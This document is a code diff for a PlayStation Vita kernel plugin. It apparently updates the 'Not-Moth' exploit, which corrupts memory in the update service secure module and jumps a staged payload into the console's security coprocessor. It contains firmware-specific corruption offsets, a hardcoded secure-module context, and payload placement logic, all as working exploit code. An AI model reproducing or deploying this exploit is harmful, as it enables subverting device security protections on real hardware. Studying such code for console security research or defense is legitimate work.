@@ -51,14 +51,43 @@ typedef struct NMPSceSblSmCommPair {
     uint32_t unk_0;
     uint32_t unk_4;
 } NMPSceSblSmCommPair;
+
+typedef struct NMPSceSblSmCommContext130 {
+    uint32_t unk_0;
+    uint32_t self_type; // 2 - user = 1 / kernel = 0
+    char data0[0x90]; //hardcoded data
+    char data1[0x90];
+    uint32_t pathId; // 2 (2 = os0)
+    uint32_t unk_12C;
+} NMPSceSblSmCommContext130;
+
+static const unsigned char NMPctx_130_data[0x90] =
+{
+  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x28, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 
+  0xc0, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 
+  0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x09, 
+  0x80, 0x03, 0x00, 0x00, 0xc3, 0x00, 0x00, 0x00, 0x80, 0x09, 
+  0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00
+};
 	
-int NMPctx = -1, NMPbuid = -1;
-uint8_t NMPidk[0xFF0];
+int NMPctx = -1, NMPbuid = -1, NMPcuid = -1;
 uint32_t NMPcpybuf[64/4];
 NMPcmd_0x50002_t NMPcargs;
 NMPSceSblSmCommPair NMPstop_res;
-static int (* NMPload_ussm)() = NULL;
-static void *NMPcorridor = NULL;
+static void *NMPcorridor = NULL, *NMPcached_sm = NULL;
+static volatile uint32_t NMPis_ussm_cached = 0;
+static volatile uint32_t NMPcorridor_paddr = 0x1C000000;
+static volatile uint32_t NMPcorridor_size = 0x1FE000;
 
 /*
 	Stage 2 payload for Not-Moth:
@@ -95,6 +124,7 @@ static int NMPconfigure_stage2(int fw) {
 		NMPstage2_payload[14] = 0x8c;
 	} else
 		return 1;
+	*(uint16_t *)(NMPstage2_payload + 2) = (NMPcorridor_paddr / 0x10000);
 	return 0;
 }
 
@@ -113,12 +143,11 @@ static int NMPreserve_commem(int smset) {
 	SceKernelAllocMemBlockKernelOpt optp;
 	optp.size = 0x58;
 	optp.attr = 2;
-	optp.paddr = 0x1C000000;
-	NMPbuid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, 0x200000, &optp);
+	optp.paddr = NMPcorridor_paddr;
+	NMPbuid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, NMPcorridor_size, &optp);
 	ksceKernelGetMemBlockBase(NMPbuid, (void**)&NMPcorridor);
-	
 	if (smset == 1)
-		memset(NMPcorridor, 0, 0x1FE000);
+		memset(NMPcorridor, 0, NMPcorridor_size);
 	return 0;
 }
 
@@ -136,7 +165,7 @@ static int NMPfree_commem(int smset) {
 		return 1;
 	NMPbuid = -1;
 	if (smset == 1)
-		memset(NMPcorridor, 0, 0x1FE000);
+		memset(NMPcorridor, 0, NMPcorridor_size);
 	ksceKernelFreeMemBlock(NMPbuid);
 	return 0;
 }
@@ -161,7 +190,7 @@ static int NMPfree_commem(int smset) {
 static int NMPcopy(void *pbuf, uint32_t off, uint32_t psz, int opmode) {
 	if (NMPbuid == -1)
 		return 1;
-	if ((0x1C000000 + off + psz) > 0x1C1FE000)
+	if ((NMPcorridor_paddr + off + psz) > (NMPcorridor_paddr + NMPcorridor_size))
 		return 2;
 	if (opmode == 0) {
 		memcpy((NMPcorridor + off), pbuf, psz);
@@ -194,7 +223,7 @@ static int NMPfile_op(const char *floc, uint32_t off, uint32_t dsz, int opmode) 
 	int fd = -1;
 	if (NMPbuid == -1)
 		return 1;
-	if ((0x1C000000 + off + dsz) > 0x1C1FE000)
+	if ((NMPcorridor_paddr + off + dsz) > (NMPcorridor_paddr + NMPcorridor_size))
 		return 2;
 	if (opmode == 0) {
 		fd = ksceIoOpen(floc, SCE_O_WRONLY | SCE_O_TRUNC | SCE_O_CREAT, 6);
@@ -240,6 +269,9 @@ static int NMPcorrupt(uint32_t addr) {
 	return 0;
 }
 
+
+extern int ksceSblSmCommStartSmFromData(int priority, const char *elf_data, int elf_size, int num1, NMPSceSblSmCommContext130 *ctx, int *id);
+extern int ksceSblSmCommStartSmFromFile(int priority, const char *elf_path, int num1, NMPSceSblSmCommContext130 *ctx, int *id);
 /*
 	exploit_init(fw)
 	Converts update_sm's 0xd0002 function.
@@ -254,21 +286,26 @@ static int NMPcorrupt(uint32_t addr) {
 static int NMPexploit_init(int fw) {
 	int ret = -1;
 	tai_module_info_t info;			
-	info.size = sizeof(info);		
-	if (taiGetModuleInfoForKernel(KERNEL_PID, "SceSblUpdateMgr", &info) >= 0) {
-		module_get_offset(KERNEL_PID, info.modid, 0, 0x51a9, &NMPload_ussm); 
-		ret = NMPload_ussm(0, &NMPctx, 0);
-		if (ret == 0) {
-			if (fw >= 0x03600000 && fw < 0x03710000) {
-				NMPCORRUPT_RANGE(0x0080bd10, 0x0080bd20);
-			} else if (fw >= 0x03710000 && fw < 0x03740000) {
-				NMPcorrupt(0x0080bd7c);
-			} else
-				return 3;
+	info.size = sizeof(info);
+	NMPSceSblSmCommContext130 smcomm_ctx;
+	memset(&smcomm_ctx, 0, sizeof(smcomm_ctx));
+    memcpy(smcomm_ctx.data0, NMPctx_130_data, 0x90);
+    smcomm_ctx.pathId = 2;
+    smcomm_ctx.self_type = (smcomm_ctx.self_type & 0xFFFFFFF0) | 2;
+	if (NMPis_ussm_cached == 0) {
+		ret = ksceSblSmCommStartSmFromFile(0, "os0:sm/update_service_sm.self", 0, &smcomm_ctx, &NMPctx);
+	} else {
+		ret = ksceSblSmCommStartSmFromData(0, NMPcached_sm, NMPis_ussm_cached, 0, &smcomm_ctx, &NMPctx);
+	}
+	if (ret == 0) {
+		if (fw >= 0x03600000 && fw < 0x03710000) {
+			NMPCORRUPT_RANGE(0x0080bd10, 0x0080bd20);
+		} else if (fw >= 0x03710000 && fw < 0x03740000) {
+			NMPcorrupt(0x0080bd7c);
 		} else
-			return 2;
+			return 3;
 	} else
-		return 1;
+		return 2;
 	return 0;
 }
 
@@ -337,18 +374,54 @@ static int NMPrun_default(void *pbuf, uint32_t psz) {
 	ret = NMPreserve_commem(1);
 	if (ret != 0)
 		return (0x10 + ret);
-	ret = NMPcopy(&NMPstage2_payload, 0x10000, sizeof(NMPstage2_payload), 0);
+	ret = NMPcopy(&NMPstage2_payload, 0, sizeof(NMPstage2_payload), 0);
 	if (ret != 0)
 		return (0x20 + ret);
-	ret = NMPcopy(pbuf, 0x10100, psz, 0);
+	ret = NMPcopy(pbuf, 0x100, psz, 0);
 	if (ret != 0)
 		return (0x30 + ret);
 	ret = NMPfree_commem(0);
 	if (ret != 0)
 		return (0x50 + ret);
-	ret = NMPf00d_jump((uint32_t)0x1C010000, fw);
+	ret = NMPf00d_jump((uint32_t)NMPcorridor_paddr, fw);
 	if (ret != 0)
 		return (0x40 + ret);
 	ksceSblSmCommStopSm(NMPctx, &NMPstop_res);
 	return 0;
+}
+
+/*
+	NMPcache_ussm(sm_path, cache)
+	Copies the update sm to memblock
+	ARG 1 (char *):
+		- sm path
+	ARG 2 (int):
+		- read? (1: cache, 0: free)
+	RET (int):
+		- 0: ok
+		- 2: cmd error
+		- 3: file error
+*/
+static int NMPcache_ussm(char *smsrc, int cache) {
+	int fd = -1;
+	if (cache == 1 && NMPis_ussm_cached == 0) {
+		NMPcuid = ksceKernelAllocMemBlock("cached_ussm", 0x1020D006, 0xc000, NULL);
+		ksceKernelGetMemBlockBase(NMPcuid, (void**)&NMPcached_sm);
+		SceIoStat stat;
+		int stat_ret = ksceIoGetstat(smsrc, &stat);
+		if(stat_ret < 0){
+			return 3;
+		} else {
+			fd = ksceIoOpen(smsrc, SCE_O_RDONLY, 0);
+			ksceIoRead(fd, NMPcached_sm, stat.st_size);
+			ksceIoClose(fd);
+		}
+		NMPis_ussm_cached = stat.st_size;
+		return 0;
+	} else if (cache == 0 && NMPis_ussm_cached > 0) {
+		ksceKernelFreeMemBlock(NMPcuid);
+		NMPis_ussm_cached = 0;
+		return 0;
+	} else 
+		return 2;
 }
